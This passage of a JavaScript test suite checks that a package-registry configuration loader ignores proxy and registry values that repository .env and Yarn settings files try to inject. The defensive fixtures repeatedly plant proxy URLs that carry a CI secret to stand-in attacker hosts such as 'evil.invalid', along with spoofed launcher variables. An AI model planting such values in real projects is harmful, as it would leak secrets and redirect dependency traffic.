test("under Yarn, a .yarnrc.yml that the caller's YARN_RC_FILENAME names, and the home .yarnrc.yml, can name judged files", async () => {
  const renamed = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/custom.yml": "injectEnvironmentFiles:\n  - custom.env\n",
      "workspace/project/custom.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: {
      CI_SECRET,
      YARN_RC_FILENAME: "custom.yml",
      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
    },
  });
  assert.equal((await loadNpmRegistryOptions(renamed)).options.proxy, undefined);
  const home = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "injectEnvironmentFiles:\n  - home.env\n",
      "home/home.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  assert.equal((await loadNpmRegistryOptions(home)).options.proxy, undefined);
});

// Third independent review of #1225, finding 1: under a direct Bun run, Bun sets neither
// npm_execpath nor npm_config_user_agent, so a project .env could set both and switch Calavera to
// the npm settings. A launcher variable from a .env file Bun loaded is repository content.
test("when Bun runs Calavera, launcher variables from a .env file do not switch Calavera to the npm settings", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env":
        "npm_execpath=/x/npm-cli.js\nnpm_config_user_agent=npm/1\nnpm_config_https_proxy=http://dotenv-evil.example:3\n",
    },
    env: {
      npm_execpath: "/x/npm-cli.js",
      npm_config_user_agent: "npm/1",
      npm_config_https_proxy: "http://dotenv-evil.example:3",
    },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.options.httpsProxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored npm_execpath, which .env sets: Calavera recognizes the package manager that started it only from variables a package manager sets, so it reads the Bun settings, as Bun runs it. Remove npm_execpath from .env.",
    "Ignored npm_config_user_agent, which .env sets: Calavera recognizes the package manager that started it only from variables a package manager sets, so it reads the Bun settings, as Bun runs it. Remove npm_config_user_agent from .env.",
  ]);
  // `bun run` sets both variables to Bun's own values after it loads .env, so the user agent
  // names Bun and the .env lines do not matter.
  const bunRun = await fixture({
    files: {
      "workspace/project/.env": "npm_execpath=/x/npm-cli.js\nnpm_config_user_agent=npm/1\n",
    },
    env: { npm_execpath: "/Users/probe/.bun/bin/bun", npm_config_user_agent: BUN },
  });
  const ownValues = await loadNpmRegistryOptions({ ...bunRun, runtime: "bun" });
  assert.deepEqual(ownValues.warnings, []);
  // Under Node, Bun loaded no .env, so the variables are the caller's.
  const node = await loadNpmRegistryOptions({ ...context, runtime: "node" });
  assert.equal(node.options.httpsProxy, "http://dotenv-evil.example:3");
});

test("a real direct Bun run with launcher variables in .env keeps the Bun settings", async (t) => {
  const context = await fixture({
    files: {
      "workspace/project/.env":
        "npm_execpath=/x/npm-cli.js\nnpm_config_user_agent=npm/1\nnpm_config_https_proxy=http://dotenv-evil.example:3\n",
    },
  });
  const script = join(context.cwd, "..", "probe-launcher.mjs");
  const loader = new URL("../src/npm-config.js", import.meta.url).href;
  await writeFile(
    script,
    `import { loadNpmRegistryOptions } from ${JSON.stringify(loader)};
const { options } = await loadNpmRegistryOptions({ cwd: process.cwd(), env: process.env });
console.log(JSON.stringify({ loaded: process.env.npm_config_user_agent === "npm/1", proxy: options.httpsProxy !== undefined }));
`,
  );
  let stdout;
  try {
    ({ stdout } = await promisify(execFile)("bun", [script], {
      cwd: context.cwd,
      env: { PATH: process.env.PATH, HOME: context.env.HOME },
    }));
  } catch (error) {
    if (/** @type {NodeJS.ErrnoException} */ (error).code !== "ENOENT") throw error;
    t.skip("Bun is not installed");
    return;
  }
  assert.deepEqual(JSON.parse(stdout), { loaded: true, proxy: false });
});

test("when Bun runs Calavera, a quoted or padded launcher variable in .env is recognized as the file's", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env": "npm_execpath = '/x/npm-cli.js'\nnpm_config_user_agent=\"npm/1\"\n",
    },
    env: { npm_execpath: "/x/npm-cli.js", npm_config_user_agent: "npm/1" },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.match(result.warnings.join("\n"), /^Ignored npm_execpath, which \.env sets/m);
  assert.match(result.warnings.join("\n"), /^Ignored npm_config_user_agent, which \.env sets/m);
});

test("a direct Bun run reads the Bun settings, so a literal npm proxy in .env is not read", async () => {
  // `bun file.js` sets neither npm_execpath nor npm_config_user_agent: Bun runs Calavera, so its
  // settings apply, and they read no npm_config_* proxy.
  const context = await fixture({
    files: { "workspace/project/.env": "npm_config_https_proxy=http://dotenv-evil.example:3\n" },
    env: { npm_config_https_proxy: "http://dotenv-evil.example:3" },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.options.httpsProxy, undefined);
  assert.deepEqual(result.warnings, []);
  // A package manager that starts Bun sets the variables, and its settings apply.
  const npm = await fixture({
    files: { "home/.npmrc": "https-proxy=http://user-proxy.example.com:1/\n" },
  });
  const started = await loadNpmRegistryOptions({
    ...npm,
    env: {
      ...npm.env,
      npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
      npm_config_user_agent: "npm/11.20.0 node/v24.3.0 darwin arm64",
    },
    runtime: "bun",
  });
  assert.equal(started.options.httpsProxy, "http://user-proxy.example.com:1/");
});

test("when Bun runs Calavera, a launcher variable that a .env file defines counts as the file's, whatever Bun made of its value", async () => {
  // Bun turns \n in a double-quoted value into a newline, so the values differ, but the file
  // still defines the variable.
  const context = await fixture({
    files: {
      "workspace/project/.env.local":
        'npm_config_user_agent="yarn/4.0\\n"\nYARN_HTTPS_PROXY=http://dotenv-evil.example:3\n',
    },
    env: { npm_config_user_agent: "yarn/4.0\n", YARN_HTTPS_PROXY: "http://dotenv-evil.example:3" },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.options.proxy, undefined);
  assert.equal(result.registry.origin, "https://registry.npmjs.org");
  assert.deepEqual(result.warnings, [
    "Ignored npm_config_user_agent, which .env.local sets: Calavera recognizes the package manager that started it only from variables a package manager sets, so it reads the Bun settings, as Bun runs it. Remove npm_config_user_agent from .env.local.",
  ]);
});

test("a real direct Bun run with only a literal npm proxy in .env reads the Bun settings, so the proxy is not used", async (t) => {
  const context = await fixture({
    files: { "workspace/project/.env": "npm_config_https_proxy=http://dotenv-evil.example:3\n" },
  });
  const script = join(context.cwd, "..", "probe-direct.mjs");
  const loader = new URL("../src/npm-config.js", import.meta.url).href;
  await writeFile(
    script,
    `import { loadNpmRegistryOptions } from ${JSON.stringify(loader)};
const { options } = await loadNpmRegistryOptions({ cwd: process.cwd(), env: process.env });
console.log(JSON.stringify({ loaded: process.env.npm_config_https_proxy !== undefined, proxy: options.httpsProxy !== undefined }));
`,
  );
  let stdout;
  try {
    ({ stdout } = await promisify(execFile)("bun", [script], {
      cwd: context.cwd,
      env: { PATH: process.env.PATH, HOME: context.env.HOME },
    }));
  } catch (error) {
    if (/** @type {NodeJS.ErrnoException} */ (error).code !== "ENOENT") throw error;
    t.skip("Bun is not installed");
    return;
  }
  assert.deepEqual(JSON.parse(stdout), { loaded: true, proxy: false });
});

test("when Bun runs Calavera and a package manager set its user agent, that package manager's settings apply", async () => {
  const context = await fixture({ userAgent: YARN });
  const { registry } = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(registry.origin, "https://registry.yarnpkg.com");
});

const NPM_STARTED_BUN = {
  npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
  npm_config_user_agent: "npm/11.20.0 node/v24.3.0 darwin arm64",
};

test("when npm starts Bun, an escaped variable that Bun unescaped in .env is not expanded into an npm proxy", async () => {
  // Bun turns \${CI_SECRET} into the literal ${CI_SECRET}, which Calavera's environment layer
  // would expand.
  const context = await fixture({
    files: {
      "workspace/project/.env": "npm_config_https_proxy=http://\\${CI_SECRET}.evil.invalid:1/\n",
    },
    env: {
      ...NPM_STARTED_BUN,
      CI_SECRET,
      npm_config_https_proxy: "http://${CI_SECRET}.evil.invalid:1/",
    },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.options.httpsProxy, undefined);
  assert.match(
    result.warnings.join("\n"),
    /^Ignored npm_config_https_proxy, which \.env sets from a variable/m,
  );
  assertNoSecret(result, new RegExp(CI_SECRET));
});

test("under Yarn, an escaped variable that Yarn unescaped in .env.yarn is not expanded into the proxy", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://\\${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: "http://${CI_SECRET}.evil.invalid:1" },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.proxy, undefined);
  assertNoSecret(result, new RegExp(CI_SECRET));
});

test("when npm starts Bun, a .env launcher variable that Bun did not apply keeps the npm settings", async () => {
  // Bun keeps a variable the caller set, so npm's own npm_execpath stays.
  const context = await fixture({
    files: {
      "home/.npmrc": "https-proxy=http://corp-proxy.example.com:1/\n",
      "workspace/project/.env": "npm_execpath=whatever\n",
    },
    env: NPM_STARTED_BUN,
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.options.httpsProxy, "http://corp-proxy.example.com:1/");
  assert.deepEqual(result.warnings, []);
});

test("when Bun runs Calavera with --env-file, the named files are judged too", async () => {
  for (const execArgv of [["--env-file=other.env"], ["--env-file", "other.env"]]) {
    const context = await fixture({
      files: {
        "workspace/project/other.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      },
      env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
    });
    const result = await loadNpmRegistryOptions({ ...context, runtime: "bun", execArgv });
    assert.equal(typeof result.requestOptions.agent, "function", execArgv.join(" "));
  }
});

test("under Bun, the note names each .npmrc proxy setting it skips, noproxy included, but not an empty value", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.npmrc": "proxy=http://plain-proxy.example.com/\nnoproxy=internal.example.com\n",
      "workspace/project/.npmrc":
        "https-proxy=\nnoproxy[]=a.example.com\nnoproxy[]=b.example.com\n",
    },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(warnings, [
    "Ignored proxy in the user .npmrc: Bun does not read proxy settings from .npmrc files, so Calavera, which Bun runs, does not either. To use a proxy, set HTTPS_PROXY.",
    "Ignored noproxy in the user .npmrc: Bun does not read proxy settings from .npmrc files, so Calavera, which Bun runs, does not either. To exclude hosts from a proxy, set NO_PROXY.",
    "Ignored noproxy in the project .npmrc: Bun does not read proxy settings from .npmrc files, so Calavera, which Bun runs, does not either. To exclude hosts from a proxy, set NO_PROXY.",
  ]);
});

test("under Yarn, a caller's own variable applies when only a file Yarn did not load names it", async () => {
  // Yarn started in packages/a, so it loaded packages/a/.env.yarn, which does not exist, and not
  // the root's.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "workspace/project/packages/a/package.json": "{}",
    },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  const member = join(context.cwd, "packages", "a");
  const result = await loadNpmRegistryOptions({
    ...context,
    yarnProcessCwd: member,
    env: { ...context.env, INIT_CWD: member },
  });
  assert.equal(result.options.proxy, "http://caller.example.com:1");
  assert.deepEqual(result.warnings, []);
  // The file Yarn did load, in the folder it started in, is judged.
  await writeFile(
    join(member, ".env.yarn"),
    "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
  );
  const loaded = await loadNpmRegistryOptions({
    ...context,
    yarnProcessCwd: member,
    env: { ...context.env, INIT_CWD: member },
  });
  assert.equal(loaded.options.proxy, undefined);
});

test("under Yarn, a .yarnrc.yml list replaces the default .env.yarn", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml": "injectEnvironmentFiles:\n  - plain.env\n",
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.proxy,
    "http://caller.example.com:1",
  );
});

test("under yarn dlx, the .env.yarn of the folder Yarn ran in is judged, and the temporary project's settings list counts", async () => {
  // yarn dlx runs a second Yarn configuration in xfs-*/dlx-<pid>, a temporary project with a copy
  // of the project's .yarnrc.yml, and passes that folder as INIT_CWD; the default .env.yarn is
  // relative to Yarn's own process folder.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "tmp/xfs-1a2b3c4d/dlx-4242/package.json": "{}\n",
      "tmp/xfs-1a2b3c4d/dlx-4242/yarn.lock": "",
      "tmp/xfs-1a2b3c4d/dlx-4242/.yarnrc.yml": "enableTelemetry: false\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const dlx = join(context.cwd, "..", "..", "tmp", "xfs-1a2b3c4d", "dlx-4242");
  const result = await loadNpmRegistryOptions({
    ...context,
    env: { ...context.env, INIT_CWD: dlx, PROJECT_CWD: dlx },
  });
  assert.equal(result.options.proxy, undefined);
  assertNoSecret(result, new RegExp(CI_SECRET));
  // A list in the temporary project's copied .yarnrc.yml resolves in that folder and replaces the
  // default.
  await writeFile(join(dlx, ".yarnrc.yml"), "injectEnvironmentFiles:\n  - dlx.env\n");
  await writeFile(join(dlx, "dlx.env"), "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid\n");
  const listed = await loadNpmRegistryOptions({
    ...context,
    env: {
      ...context.env,
      INIT_CWD: dlx,
      PROJECT_CWD: dlx,
      YARN_NPM_REGISTRY_SERVER: "https://caller-mirror.example.com",
    },
  });
  // The project's .env.yarn is no longer loaded, so its proxy is not judged; dlx.env's registry is.
  assert.equal(listed.options.proxy, `http://${CI_SECRET}.evil.invalid:1`);
  assert.equal(listed.registry.origin, "https://registry.yarnpkg.com");
});
test("under Yarn, a file Yarn may have loaded that sets one of Yarn's own inputs makes Calavera ignore every variable, and the warning says why", async () => {
  for (const [file, content] of [
    [".env.yarn", "YARN_RC_FILENAME=none.yml\n"],
    [".env.yarn", "HOME=/somewhere\n"],
  ]) {
    const context = await fixture({
      userAgent: YARN,
      files: { [`workspace/project/${file}`]: content },
      env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
    });
    const name = content.split("=")[0];
    const result = await loadNpmRegistryOptions({
      ...context,
      env: { ...context.env, [name]: content.split("=")[1].trim() },
    });
    assert.equal(result.options.proxy, undefined, name);
    assert.deepEqual(
      result.warnings,
      [
        `Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because .env.yarn sets ${name}, which changes the files Yarn loads. Remove ${name} from .env.yarn.`,
      ],
      name,
    );
  }
});

test("without INIT_CWD, Yarn's script environment did not start Calavera, so no environment file was loaded", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  const { INIT_CWD: _initCwd, ...env } = context.env;
  const { options } = await loadNpmRegistryOptions({ ...context, env });
  assert.equal(options.proxy, "http://caller.example.com:1");
});

test("under Yarn, a backslash before an ordinary character stays in an injectEnvironmentFiles path, as in Yarn", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml": "injectEnvironmentFiles:\n  - './a\\b.env'\n",
      "workspace/project/a\\b.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  assert.equal((await loadNpmRegistryOptions(context)).options.proxy, undefined);
});

test("under Yarn without /proc, every .env.yarn that Yarn could have read counts, and only the variables they set from a variable are ignored", async () => {
  // `yarn workspace app ...` from the root: INIT_CWD is the workspace, and Yarn ran somewhere in
  // the project, which Calavera cannot see, so the root's and every other project folder's
  // .env.yarn count.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/packages/app/package.json": "{}",
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "workspace/project/packages/other/.env.yarn":
        "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid\n",
    },
    env: {
      CI_SECRET,
      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
      YARN_NPM_REGISTRY_SERVER: `https://${CI_SECRET}.invalid`,
      YARN_HTTP_PROXY: "http://caller.example.com:1",
    },
  });
  const result = await loadNpmRegistryOptions({
    ...context,
    yarnProcessCwd: null,
    env: { ...context.env, INIT_CWD: join(context.cwd, "packages", "app") },
  });
  assert.equal(result.options.proxy, undefined);
  assert.equal(result.registry.origin, "https://registry.yarnpkg.com");
  assert.equal(result.warnings.length, 2);
  assert.match(
    result.warnings[0],
    /^Ignored YARN_HTTPS_PROXY, which \.env\.yarn sets from a variable/,
  );
  assertNoSecret(result, new RegExp(CI_SECRET));
});

test("under Yarn without /proc, a literal .env.yarn registry and a caller's own unrelated proxy both apply", async () => {
  // A macOS-style run: Calavera cannot read Yarn's folder, but no candidate sets a value from a
  // variable.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn":
        "YARN_NPM_REGISTRY_SERVER=https://literal-mirror.example.com\n",
    },
    env: {
      YARN_NPM_REGISTRY_SERVER: "https://literal-mirror.example.com",
      YARN_HTTPS_PROXY: "http://caller.example.com:1",
    },
  });
  const result = await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null });
  assert.equal(result.registry.origin, "https://literal-mirror.example.com");
  assert.equal(result.options.proxy, "http://caller.example.com:1");
  assert.deepEqual(result.warnings, []);
});

test("under Yarn without /proc, a .env.yarn above the project or above the folder Calavera started in counts, as after --cwd or yarn dlx", async () => {
  // `yarn --cwd project ...` from the parent folder reads the parent's .env.yarn.
  const above = await fixture({
    userAgent: YARN,
    files: { "workspace/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n" },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  assert.equal(
    (await loadNpmRegistryOptions({ ...above, yarnProcessCwd: null })).options.proxy,
    undefined,
  );
  // yarn dlx: PROJECT_CWD and INIT_CWD name the temporary project, and Yarn ran in the folder the
  // binary runs in, where Calavera starts.
  const dlx = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "tmp/xfs-1a2b/dlx-4242/package.json": "{}\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const temporary = join(dlx.cwd, "..", "..", "tmp", "xfs-1a2b", "dlx-4242");
  const result = await loadNpmRegistryOptions({
    ...dlx,
    yarnProcessCwd: null,
    env: { ...dlx.env, INIT_CWD: temporary, PROJECT_CWD: temporary },
  });
  assert.equal(result.options.proxy, undefined);
  // A sibling project outside every candidate is not judged.
  const sibling = await fixture({
    userAgent: YARN,
    files: { "workspace/other/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n" },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  assert.equal(
    (await loadNpmRegistryOptions({ ...sibling, yarnProcessCwd: null })).options.proxy,
    "http://caller.example.com:1",
  );
});

test("under Yarn without /proc, a candidate set that cannot be bounded makes every variable ignored, and the warning says why", async () => {
  // Without PROJECT_CWD, Calavera does not know the project Yarn ran in.
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.env.yarn": "PLAIN=1\n" },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  const { PROJECT_CWD: _projectCwd, ...env } = context.env;
  const result = await loadNpmRegistryOptions({ ...context, env, yarnProcessCwd: null });
  assert.equal(result.options.proxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because it cannot see the folder Yarn ran in, and Yarn passed no PROJECT_CWD, so the folders Yarn could have run in are unknown. List the file Yarn loads in injectEnvironmentFiles in the project's .yarnrc.yml, or an empty list if it loads none, so Calavera can tell.",
  ]);
  // A project with more folders than Calavera walks cannot be bounded either.
  const large = await fixture({
    userAgent: YARN,
    files: { "workspace/project/a/b/c/d/.keep": "", "workspace/project/.env.yarn": "PLAIN=1\n" },
  });
  const files = await yarnEnvironmentFiles({
    env: large.env,
    startingCwd: large.cwd,
    accountHome: large.accountHome,
    cwd: large.cwd,
    yarnProcessCwd: null,
    folderLimit: 3,
  });
  assert.match(
    files.undetermined?.reason ?? "",
    /the project has more folders than Calavera searches/,
  );
});

test("under Yarn, the folder Yarn ran in decides the default .env.yarn, also under --cwd or yarn workspace", async () => {
  // INIT_CWD names packages/app, but Yarn ran in the root, so the root's .env.yarn was loaded.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "workspace/project/packages/app/.env.yarn":
        "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid\n",
    },
    env: {
      CI_SECRET,
      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
      YARN_NPM_REGISTRY_SERVER: "https://caller-mirror.example.com",
    },
  });
  const result = await loadNpmRegistryOptions({
    ...context,
    yarnProcessCwd: context.cwd,
    env: { ...context.env, INIT_CWD: join(context.cwd, "packages", "app") },
  });
  assert.equal(result.options.proxy, undefined);
  // packages/app/.env.yarn was not loaded, so the caller's registry applies.
  assert.equal(result.registry.origin, "https://caller-mirror.example.com");
});

test("yarnParentCwd reads the working folder of a Yarn parent process from /proc on Linux, only when the parent runs Yarn", async () => {
  /** @param {string} cmdline @param {string} [platform] */
  const read = (cmdline, platform = "linux") =>
    yarnParentCwd({
      platform,
      ppid: 4242,
      readFile: async (path) => {
        assert.equal(path, "/proc/4242/cmdline");
        return cmdline;
      },
      readlink: async (path) => {
        assert.equal(path, "/proc/4242/cwd");
        return "/repo";
      },
    });
  for (const yarn of [
    "node\0/usr/lib/node_modules/corepack/dist/yarn.js\0workspace\0",
    "node\0/home/u/.cache/node/corepack/v1/yarn/4.18.1/yarn.js\0exec\0",
    "node\0/repo/.yarn/releases/yarn-4.18.1.cjs\0run\0",
    "/usr/local/bin/yarn\0run\0",
  ]) {
    assert.equal(await read(yarn), "/repo", yarn);
  }
  // A shell script whose name or arguments merely mention yarn is not Yarn.
  for (const other of [
    "sh\0./scripts/yarn-ci.sh\0",
    "node\0/usr/bin/npm-cli.js\0exec\0yarn\0",
    "bash\0-c\0cd packages/app && yarn-like\0",
  ]) {
    assert.equal(await read(other), null, other);
  }
  // Only Linux has /proc; macOS and Windows use the candidate files.
  assert.equal(await read("node\0/x/yarn.js\0", "darwin"), null);
  assert.equal(await read("node\0/x/yarn.js\0", "win32"), null);
});

test("under Yarn without a known folder, a candidate's claim stays although a later candidate sets the same variable literally", async () => {
  // Yarn loaded at most one candidate, so a literal value in another cannot replace the claim.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "workspace/project/packages/app/.env.yarn": "YARN_HTTPS_PROXY=http://plain.example.com:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null });
  assert.equal(result.options.proxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored YARN_HTTPS_PROXY, which .env.yarn sets from a variable, and Yarn may have loaded that file: Calavera cannot see the folder Yarn ran in, which decides which .env.yarn Yarn read, and Calavera does not take a variable's value from a project file. Write the value without a variable in .env.yarn, or list the file Yarn loads in injectEnvironmentFiles in the project's .yarnrc.yml, or an empty list if it loads none, so Calavera can tell.",
  ]);
});

test("under Yarn without a known folder, dot-folders are not searched for a .env.yarn", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.next/cache/.env.yarn":
        "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null })).options.proxy,
    "http://caller.example.com:1",
  );
});

test("under Yarn, a string or an onConflict form of injectEnvironmentFiles, which Calavera does not model, makes every variable ignored", async () => {
  for (const value of [
    "injectEnvironmentFiles: .env.ci\n",
    "injectEnvironmentFiles:\n  onConflict: reset\n  value:\n    - .env.ci\n",
  ]) {
    const context = await fixture({
      userAgent: YARN,
      files: { "workspace/project/.yarnrc.yml": value },
      env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
    });
    const result = await loadNpmRegistryOptions(context);
    assert.equal(result.options.proxy, undefined, value);
    assert.match(
      result.warnings.join("\n"),
      /because \.yarnrc\.yml sets injectEnvironmentFiles in a form Calavera does not read\. Write injectEnvironmentFiles as a list of paths\./,
      value,
    );
  }
});

test("under Yarn, YARN_INJECT_ENVIRONMENT_FILES in the environment, in any spelling Yarn reads, makes every variable ignored, because a loaded file could have changed it", async () => {
  for (const name of [
    "YARN_INJECT_ENVIRONMENT_FILES",
    "YARN_INJECT_ENVIRONMENT__FILES",
    "yarn_inject-environment-files",
  ]) {
    const context = await fixture({
      userAgent: YARN,
      env: { [name]: "harmless.env", YARN_HTTPS_PROXY: "http://caller.example.com:1" },
    });
    const result = await loadNpmRegistryOptions(context);
    assert.equal(result.options.proxy, undefined, name);
    assert.match(
      result.warnings.join("\n"),
      /because YARN_INJECT_ENVIRONMENT_FILES is set, and a file that Yarn loaded can change it, so Calavera cannot tell the value Yarn used\. List the files in injectEnvironmentFiles in the project's \.yarnrc\.yml instead\./,
      name,
    );
  }
});

test("under Yarn, a HOME other than the account's makes the set undetermined only when a home .yarnrc.yml lists files", async () => {
  const listing = await fixture({
    userAgent: YARN,
    files: { "elsewhere/.yarnrc.yml": "injectEnvironmentFiles:\n  - f.env\n" },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  const other = join(listing.cwd, "..", "..", "elsewhere");
  const undetermined = await loadNpmRegistryOptions({
    ...listing,
    env: { ...listing.env, HOME: other },
  });
  assert.equal(undetermined.options.proxy, undefined);
  assert.match(
    undetermined.warnings.join("\n"),
    /because HOME names another folder than your account's home/,
  );
  const quiet = await fixture({
    userAgent: YARN,
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  const applied = await loadNpmRegistryOptions({
    ...quiet,
    env: { ...quiet.env, HOME: join(quiet.cwd, "..", "..", "elsewhere") },
  });
  assert.equal(applied.options.proxy, "http://caller.example.com:1");
});

test("under Yarn, a variable in an injectEnvironmentFiles path is expanded as Yarn expands it, with an empty environment", async () => {
  // Yarn expands these paths before it has loaded any environment, so ${NAME:-prod} is prod.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml": "injectEnvironmentFiles:\n  - ./${ENV_NAME:-prod}.env\n",
      "workspace/project/prod.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "workspace/project/stage.env": "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid\n",
    },
    env: {
      CI_SECRET,
      ENV_NAME: "stage",
      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
      YARN_NPM_REGISTRY_SERVER: "https://caller-mirror.example.com",
    },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.proxy, undefined);
  assert.equal(result.registry.origin, "https://caller-mirror.example.com");
});

// Independent review of 5476708 on #1225.

test("when Bun runs Calavera directly, a launcher variable that a .env file sets from a variable keeps the Bun settings", async () => {
  // Bun expanded npm_execpath=${A} to /x/npm-cli.js, so the value Calavera sees differs from the
  // file's text; the file still set it.
  const context = await fixture({
    files: {
      "workspace/project/.env":
        "A=/x/npm-cli.js\nnpm_execpath=${A}\nnpm_command=exec\nnpm_config_https_proxy=http://dotenv-evil.example:3\n",
    },
    env: {
      A: "/x/npm-cli.js",
      npm_execpath: "/x/npm-cli.js",
      npm_command: "exec",
      npm_config_https_proxy: "http://dotenv-evil.example:3",
    },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.options.httpsProxy, undefined);
  assert.match(result.warnings.join("\n"), /^Ignored npm_execpath, which \.env sets/m);
});

test("when Bun runs Calavera, the warning for a variable a .env file sets from a variable says Calavera cannot tell where the value came from, also with --no-env-file", async () => {
  // The caller set HTTPS_PROXY in their own shell, which Bun keeps; with --no-env-file Bun
  // loaded no .env at all. Either way the remedy that works is to change the file.
  for (const execArgv of [[], ["--no-env-file"]]) {
    const context = await fixture({
      files: { "workspace/project/.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n" },
      env: { HTTPS_PROXY: "http://corp.example.com:3128" },
    });
